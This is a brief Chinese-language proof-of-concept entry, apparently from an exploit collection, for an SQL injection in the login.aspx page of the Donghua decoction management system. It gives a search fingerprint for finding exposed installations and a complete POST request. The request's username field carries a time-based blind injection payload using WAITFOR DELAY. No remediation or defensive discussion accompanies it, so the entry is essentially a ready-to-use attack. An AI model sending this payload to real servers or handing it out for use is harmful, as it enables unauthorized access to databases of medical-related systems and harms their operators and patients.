# 东华原煎药管理系统login.aspx存在SQL注入漏洞

- **系统**：东华原煎药管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="北京东华原煎药管理系统"`
- **请求**：`POST /login.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: ASP.NET_SessionId=qowootsbthgq0qghakgpkxqb`　`Priority: u=0, i`　`Content-Length: 316`

**请求体 / payload**
```
__VIEWSTATE=%2FwEPDwUKLTUwOTQ0NDQ3MWRk5giHO8X2jpZxiHEHQ9uVOA9Eypf30XmTxFb7hjjUaLY%3D&__EVENTVALIDATION=%2FwEdAAQ%2F3WSTSkohBZOLzmy%2FWshxY3plgk0YBAefRz3MyBlTcE5Fo5u8Nmrtdka2GVrCes2inihG6d%2FXh3PZm3b5AoMQ%2B991E8ydMX%2Bj2%2BZsAzXdcmPtd%2BEvhZf7Bll1aAmGtMw%3D&txtUserName=';WAITFOR+DELAY+'0:0:5'--&txtUserPwd=%27&btnLogin=%E7%99%BB%E5%BD%95
```
- **预期**：200　|　—